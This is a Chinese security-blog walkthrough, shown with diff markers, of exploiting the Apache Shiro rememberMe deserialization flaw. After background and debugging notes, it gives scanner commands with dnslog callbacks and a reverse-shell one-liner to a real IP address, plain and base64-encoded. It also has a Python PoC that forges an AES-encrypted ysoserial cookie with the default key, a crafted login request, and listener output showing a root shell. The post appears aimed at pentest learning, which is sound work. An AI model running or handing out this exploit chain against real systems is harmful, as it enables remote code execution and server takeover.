+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-SQL注入原理分析" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/ALL-SQL-INJECTION-ANALYSIS/">I. SQL注入原理分析</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Struts2Deser" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Struts2Deser/">II. STRUTS2DESER</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-基于内存的Shiro框架Webshell攻击研究" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/">III. 基于内存的SHIRO框架WEBSHELL攻击研究</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-通达OA利用代码分析" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/ToDa-OA-VulnPoc-by-java-analysis/">IV. 通达OA利用代码分析</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-JRMP-Gadget" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/JRMP-Gadget/">V. JRMP-GADGET</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details open>
+											<summary class="edSFyN flex justify-between">
+												<a><strong>反序列化</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-ShiroDeser" class="table-of-contents table-of-contents__left-border  active">
+													<a href="/about/ShiroDeser/">I. SHIRODESER</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-javaDeser" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/javaDeser/">II. JAVADESER</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+									</ul>
+								</details>
+							
+							</div>
+						</form>
+					</div><!--响应式::菜单::表单 end class="area-scroll" style="height:100vh"-->
+					<div><!--clas="Box"-->
+						<center>
+							
+							<csmall>本文发布于：<em>2020-05-18</em>并最后修改于：<em>2021-11-19</em></csmall>
+							
+							<csmall><em> | 哨兵安全实验室</em></csmall>
+						</center>
+						<h1><!--href="javascript:window.print()"-->
+							<span class="post-print pull-right"><a onclick="printpage()">
+							<ion-icon><svg xmlns="http://www.w3.org/2000/svg" width="49" height="49" viewBox="0 0 512 512" style="fill:currentColor;stroke:none;"><title>Print document</title><path d="M400,96V56a8,8,0,0,0-8-8H120a8,8,0,0,0-8,8V96"/><rect x="152" y="264" width="208" height="160" rx="4" ry="4" style="fill:none;stroke:none;"/><path d="M408,112H104a56,56,0,0,0-56,56V376a8,8,0,0,0,8,8h56v72a8,8,0,0,0,8,8H392a8,8,0,0,0,8-8V384h56a8,8,0,0,0,8-8V168A56,56,0,0,0,408,112ZM360,420a4,4,0,0,1-4,4H156a4,4,0,0,1-4-4V268a4,4,0,0,1,4-4H356a4,4,0,0,1,4,4ZM394,207.92a24,24,0,1,1,22-22A24,24,0,0,1,394,207.92Z"/></svg>
+							</ion-icon></a></span>
+							<span class="post-print pull-right"><a href="https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/about/Deser-Walkthrough/2020-05-18-ShiroDeser.md" target="_blank">
+							<ion-icon><svg xmlns="http://www.w3.org/2000/svg" width="49" height="49" viewBox="0 0 512 512" style="fill:currentColor;stroke:none;"><title>Edit on github</title><path d="M459.94,53.25a16.06,16.06,0,0,0-23.22-.56L424.35,65a8,8,0,0,0,0,11.31l11.34,11.32a8,8,0,0,0,11.34,0l12.06-12C465.19,69.54,465.76,59.62,459.94,53.25Z"/><path d="M399.34,90,218.82,270.2a9,9,0,0,0-2.31,3.93L208.16,299a3.91,3.91,0,0,0,4.86,4.86l24.85-8.35a9,9,0,0,0,3.93-2.31L422,112.66A9,9,0,0,0,422,100L412.05,90A9,9,0,0,0,399.34,90Z"/><path d="M386.34,193.66,264.45,315.79A41.08,41.08,0,0,1,247.58,326l-25.9,8.67a35.92,35.92,0,0,1-44.33-44.33l8.67-25.9a41.08,41.08,0,0,1,10.19-16.87L318.34,125.66A8,8,0,0,0,312.69,112H104a56,56,0,0,0-56,56V408a56,56,0,0,0,56,56H344a56,56,0,0,0,56-56V199.31A8,8,0,0,0,386.34,193.66Z"/></svg>
+							</ion-icon>
+							</a></span>
+						</h1>
+						<div class="col-lg-push-3 ml-hide">
+    <!---->
+    <div class="nav nav-stacked tableOfContents_35-E thin-scrollbar">
+        <h5 class="lead">文章目录</h5>
+        <li class="table-of-contents__left-border table-of-contents">
+            <code-index-css>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h1"><a href="#shiro-deser">Shiro Deser</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h1"><a href="#零shiro框架的简介和相关用途">零：Shiro框架的简介和相关用途</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#0x01简介">0x01：简介</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#0x02用途">0x02：用途</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h1"><a href="#一shiro框架反序列化的原因">一：Shiro框架反序列化的原因</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x01shiro代码层分析">1x01：Shiro代码层分析</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x02为什么这么写">1x02：为什么这么写</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h1"><a href="#%E6%9B%B4%E6%96%B0%E4%B8%AD">更新中...</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h1"><a href="#二验证">二：验证</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#2x01getshell">2x01：getshell</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#2x02学习工具">2x02：学习工具</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#2x03how-to-poc">2x03：how to poc</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#案例">案例</a></li>
+</ul>
+</li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+    
+</div>
+						<h1 id="shiro-deser">Shiro Deser</h1>
+
+<p><strong>写在文前：</strong></p>
+
+<p>本文是我自己在实践中的一些理解和经历，希望能够记录下来；
+第一小结是后期在自己对这个框架有一定的认知后做的总结，修改记录可以看下面，第二小结是在学习中在网上的一些学习过程，当时也记录下来了。
+故此分为两个小结。</p>
+
+<p><strong>——致勤奋的所有人</strong></p>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th style="text-align: left">不一样的SHIRO框架浅析思路梳理</th>
+      <th style="text-align: left"> </th>
+      <th style="text-align: left"> </th>
+      <th style="text-align: left"> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">SHIRO框架简介以及相关用途</td>
+      <td style="text-align: left">反序列化分析</td>
+      <td style="text-align: left">为什么写这样的代码</td>
+      <td style="text-align: left">反序列化实战</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">✅简介：关于SHIRO的历史和相关实现组件</td>
+      <td style="text-align: left">✅ JAVA代码反序列化FRAMES</td>
+      <td style="text-align: left">❎开发者写这样代码的用意</td>
+      <td style="text-align: left">✅利用GADGET生成COOKIE</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">✅用途：SHIRO框架的使用场景和解决痛点</td>
+      <td style="text-align: left">✅ <a href="/about/Dynamic-analysis-of-java-framework-code/">调试环境部署</a></td>
+      <td style="text-align: left">❎开发者如何修复</td>
+      <td style="text-align: left">✅最终目标：GETSHELL</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>本文初次记于2020/05/18；一次修改于2021/01/04上午；</p>
+
+<ul>
+  <li>添加了文章目录；</li>
+  <li>在原先文章基础不变的情况下，调整了整体文章的阐述框架，添加如下：
+    <ul>
+      <li>技术分析；</li>
+      <li>开发分析。</li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="零shiro框架的简介和相关用途">零：Shiro框架的简介和相关用途</h1>
+
+<p><img src="https://image.yjs2635.xyz/images/2022/02/20/Ab68nZiLOqcwoh4.png" alt="Ab68nZiLOqcwoh4.png" /></p>
+
+<hr />
+
+<p><strong>Apache Shiro（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会话管理。</strong>
+<strong>Shiro框架直观、易用，同时也能提供健壮的安全性。</strong></p>
+
+<p>————来自于<a href="https://zh.wikipedia.org/wiki/Apache_Shiro" target="_blank">维基百科</a></p>
+
+<h3 id="0x01简介">0x01：简介</h3>
+
+<p><em>Shiro</em>三个核心组件：<em>Subject</em>, <em>SecurityManager</em> 和 <em>Realms</em>.</p>
+
+<ul>
+  <li>
+    <p>Subject：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。
+Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。</p>
+  </li>
+  <li>
+    <p>SecurityManager：它是Shiro框架的核心，典型的Facade模式，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供安全管理的各种服务。</p>
+  </li>
+  <li>
+    <p>Realm： Realm充当了Shiro与应用安全数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。</p>
+  </li>
+</ul>
+
+<p><del>从这个意义上讲，Realm实质上是一个安全相关的DAO：它封装了数据源的连接细节，并在需要时将相关数据提供给Shiro。</del>
+<del>当配置Shiro时，你必须至少指定一个Realm，用于认证和（或）授权。配置多个Realm是可以的，但是至少需要一个。</del>
+<del>Shiro内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。如果系统默认的Realm不
+能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。</del></p>
+
+<h3 id="0x02用途">0x02：用途</h3>
+
+<blockquote>
+  <p>Apache Shiro是Java的一个安全框架。Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境，
+Shiro可以帮助我们完成：认证、授权、加密、会话管理、与Web集成、缓存等。</p>
+</blockquote>
+
+<p>上面说的比较官方一点，我们可以简单一点理解，她就是一个<code class="language-plaintext highlighter-rouge">开源的集成权限框架</code>，这是我们在市面上很多的应用。我们在漏洞挖掘的过程中，如果存在WEB验证机制，
+有可能会存在登录绕过，所以</p>
+
+<p><strong>现在很多j2ee开发都会采用shiro框架来做权限控制，框架的优势是十分明显的，但凡事有利有弊，有优势当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到；
+从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。</strong></p>
+
+<blockquote>
+  <p>目前，使用Apache Shiro的人越来越多，因为它<strong>相当简单</strong>，对比Spring Security，
+可能没有Spring Security做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的Shiro就足够了。
+对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。</p>
+</blockquote>
+
+<h1 id="一shiro框架反序列化的原因">一：Shiro框架反序列化的原因</h1>
+
+<h3 id="1x01shiro代码层分析">1x01：Shiro代码层分析</h3>
+
+<ul>
+  <li><strong>web.xml</strong></li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;welcome-file-list&gt;</span>
+    <span class="nt">&lt;welcome-file&gt;</span>index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
+<span class="nt">&lt;/welcome-file-list&gt;</span>
+</code></pre></div></div>
+
+<p>代码大致逻辑：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nl">jsp:</span><span class="n">forward</span> <span class="n">page</span><span class="o">=</span><span class="s">"home.jsp"</span><span class="o">/&gt;</span>
+<span class="c1">//跳到home.jsp home页面包含include.jsp</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">include</span> <span class="n">file</span><span class="o">=</span><span class="s">"include.jsp"</span> <span class="o">%&gt;</span>
+<span class="c1">//include.jsp导入SecurityUtils类</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">org.apache.shiro.SecurityUtils</span><span class="err">"</span> <span class="o">%&gt;</span>
+</code></pre></div></div>
+
+<p><a href="#"> <i class="fa fa-hand-o-down"></i></a></p>
+
+<p><kbd>⌘</kbd>+ 左键单击 <code class="language-plaintext highlighter-rouge">SecurityUtils</code> 跳转</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class
+</code></pre></div></div>
+
+<p>那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；</p>
+
+<ul>
+  <li>
+    <p>参考</p>
+  </li>
+  <li><a href="https://www.jianshu.com/p/ccd0b79db702" target="_blank">Shiro 认证流程分析</a></li>
+  <li><a href="https://blog.csdn.net/w1196726224/article/details/53560385" target="_blank">Shiro 登录认证源码详解</a></li>
+</ul>
+
+<p>先直接在home.jsp页面处下断点，处理流程大概如下：</p>
+<ul>
+  <li>JavaServer Pages：
+    <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">_jspService</span><span class="o">(</span><span class="nc">HttpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span><span class="o">):</span><span class="mi">21</span><span class="o">,</span> <span class="n">index_jsp</span>
+  <span class="c1">//正常jsp server请求</span>
+  <span class="n">service</span><span class="o">(</span><span class="nc">HttpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span><span class="o">):</span><span class="mi">71</span><span class="o">,</span> <span class="nc">HttpJspBase</span>
+  <span class="c1">//server响应request，返回JSESSIONID</span>
+  <span class="n">service</span><span class="o">(</span><span class="nc">ServletRequest</span><span class="o">,</span> <span class="nc">ServletResponse</span><span class="o">):</span><span class="mi">733</span><span class="o">,</span> <span class="nc">HttpServlet</span>
+  <span class="c1">//以返回的JSESSIONID COOKIE访问http://127.0.0.1:8080/shiro/account</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Server Applet
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  httpServerlet
+</code></pre></div>    </div>
+  </li>
+  <li>Shiro web Serverlet
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ShiroHttpServletRequest
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>web http访问后，访问调用如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this <span class="o">=</span> <span class="o">{</span>index_jsp@4030<span class="o">}</span> 
+request <span class="o">=</span> <span class="o">{</span>ShiroHttpServletRequest@5282<span class="o">}</span> 
+response <span class="o">=</span> <span class="o">{</span>ResponseFacade@4532<span class="o">}</span> 
+_jspx_method <span class="o">=</span> <span class="s2">"GET"</span>
+out <span class="o">=</span> <span class="o">{</span>JspWriterImpl@5284<span class="o">}</span>
+_jspx_out <span class="o">=</span> <span class="o">{</span>JspWriterImpl@5284<span class="o">}</span> 
+_jspx_page_context <span class="o">=</span> <span class="o">{</span>PageContextImpl@5285<span class="o">}</span> 
+pageContext <span class="o">=</span> <span class="o">{</span>PageContextImpl@5285<span class="o">}</span> 
+</code></pre></div></div>
+
+<p>基本上就是这个流程；</p>
+
+<h3 id="1x02为什么这么写">1x02：为什么这么写</h3>
+
+<h1>更新中...</h1>
+
+<h1 id="二验证">二：验证</h1>
+<p>在上面的简述中，可以来进行shiro框架的判断漏洞特征：</p>
+
+<ul>
+  <li>1.在返回包的Set-Cookie的值为「rememberMe=deleteMe」；</li>
+  <li>2.JESSession Cookie.实际渗透中如果遇到可以尝试加入rememberMe Cookie探测是否使用shiro框架；</li>
+  <li>3.特定CMS集成shiro框架；
+    <ul>
+      <li>1）jeesite</li>
+      <li>2）iBase4J</li>
+      <li>等等</li>
+    </ul>
+  </li>
+</ul>
+
+<p>同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
+用到的是<a href="http://www.svenbeast.com/post/tskRKJIPg/" target="_blank">Shiroscan by 斯文</a>脚本，开源在github上，用法就不多赘述。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 shiro_rce.py https://shiro.vuln.ip/login.html <span class="s2">"ping x.dnslog.cn"</span>
+ ____  _     _          ____                  
+/ ___|| |__ <span class="o">(</span>_<span class="o">)</span>_ __ ___/ ___|  ___ __ _ _ __  
+<span class="se">\_</span>__ <span class="se">\|</span> <span class="s1">'_ \| | '</span>__/ _ <span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \ 
+ ___) | | | | | | | (_) |__) | (_| (_| | | | |
+|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|
+
+                           By 斯文
+
+Welcome To Shiro反序列化 RCE ! 
+[*]  开始检测模块 Class1:CommonsBeanutils1
+</span></code></pre></div></div>
+<p>然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+</code></pre></div></div>
+<p>当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
+<a href="https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/" target="_blank">作者博客</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python shiro_exp.py https://shiro.vuln.ip/login.html
+try CipherKey :4AvVhmFLUs0KTA3Kprsdag<span class="o">==</span>
+generator payload <span class="k">done</span><span class="nb">.</span>
+send payload ok.
+checking.....
+checking.....
+checking.....
+checking.....
+vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag<span class="o">==</span>
+</code></pre></div></div>
+<p>当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。</p>
+
+<h3 id="2x01getshell">2x01：getshell</h3>
+<p>通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/47.52.233.92/11111 0&gt;&amp;1</code>，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
+转成base64编码 :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="o">{</span><span class="nb">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx<span class="o">}</span>|<span class="o">{</span><span class="nb">base64</span>,-d<span class="o">}</span>|<span class="o">{</span>bash,-i<span class="o">}</span>
+</code></pre></div></div>
+
+<p>像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多</p>
+
+<ul>
+  <li><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank">java.lang.Runtime.exec()转换网址</a></li>
+</ul>
+
+<p>监听端口等待shell回连（我这里的样例是docker环境）</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvvp 11111
+Listening on [0.0.0.0] (family 0, port 11111)
+Connection from 59.110.152.168 47274 received!
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@6d5a7848dbef:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h3 id="2x02学习工具">2x02：学习工具</h3>
+<p>使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package -D skipTests
+</code></pre></div></div>
+
+<h3 id="2x03how-to-poc">2x03：how to poc</h3>
+<p>使用poc代码获得对应的rememberMe的cookie值。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># -*- coding:utf-8 -*-
+import sys
+import uuid
+import base64
+import subprocess
+from Crypto.Cipher import AES
+
+def encode_rememberme(command):
+    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == '__main__':
+    payload = encode_rememberme(sys.argv[1])    
+print "rememberMe={0}".format(payload.decode())
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D:\bin4xin\code\shiro\shrio-poc\ysoserial\target&gt; python .\shrio-poc.py 47.52.233.92:6666
+rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==
+</code></pre></div></div>
+
+<p>抓包，前台登录拦包，勾选<code class="language-plaintext highlighter-rouge">Remember Me</code>，截获数据包，替换cookie构造数据包：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /doLogin HTTP/1.1
+underattack-host: underattack-host:8080
+Content-Length: 55
+Cache-Control: max-age=0
+Origin: http://underattack-host:8080
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://underattack-host:8080/login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
+Connection: close
+
+username=asdmnin&amp;password=asdasd&amp;rememberme=remember-me
+</code></pre></div></div>
+<p>使用包监听6666端口：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target# java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
+* Opening JRMP listener on 6666
+</code></pre></div></div>
+<p>发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Have connection from /underattack-host:58272
+Reading message...
+Is DGC call for [[0:0:0, 356978429], [0:0:0, 2006635131]]
+Sending return with payload for obj [0:0:0, 2]
+Closing connection
+Have connection from /underattack-host:58274
+Reading message...
+Is DGC call for [[0:0:0, 356978429], [0:0:0, -1104978848], [0:0:0, 2006635131]]
+Sending return with payload for obj [0:0:0, 2]
+Closing connection
+</code></pre></div></div>
+
+<h3 id="案例">案例</h3>
+
+<p>/usr/local/nginx/conf/nginx.conf</p>
+
+<p>inet addr:192.168.100.242  Bcast:192.168.100.255  Mask:255.255.255.0</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c">&lt;!-- Apache Shiro --&gt;</span>
+  <span class="nt">&lt;filter&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>shiroFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;filter-class&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="nt">&lt;/filter-class&gt;</span>
+    <span class="nt">&lt;init-param&gt;</span>
+      <span class="nt">&lt;param-name&gt;</span>targetFilterLifecycle<span class="nt">&lt;/param-name&gt;</span>
+      <span class="nt">&lt;param-value&gt;</span>true<span class="nt">&lt;/param-value&gt;</span>
+    <span class="nt">&lt;/init-param&gt;</span>
+  <span class="nt">&lt;/filter&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>shiroFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+
+  <span class="c">&lt;!-- PageCache, cache .html suffix.
+  &lt;filter&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.thinkgem.jeesite.common.filter.PageCachingFilter&lt;/filter-class&gt;
+  &lt;/filter&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;*.html&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;--&gt;</span>
+
+  <span class="c">&lt;!-- SiteMesh --&gt;</span>
+  <span class="nt">&lt;filter&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;filter-class&gt;</span>com.opensymphony.sitemesh.webapp.SiteMeshFilter<span class="nt">&lt;/filter-class&gt;</span>
+  <span class="nt">&lt;/filter&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/a/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/f/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+</code></pre></div></div>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
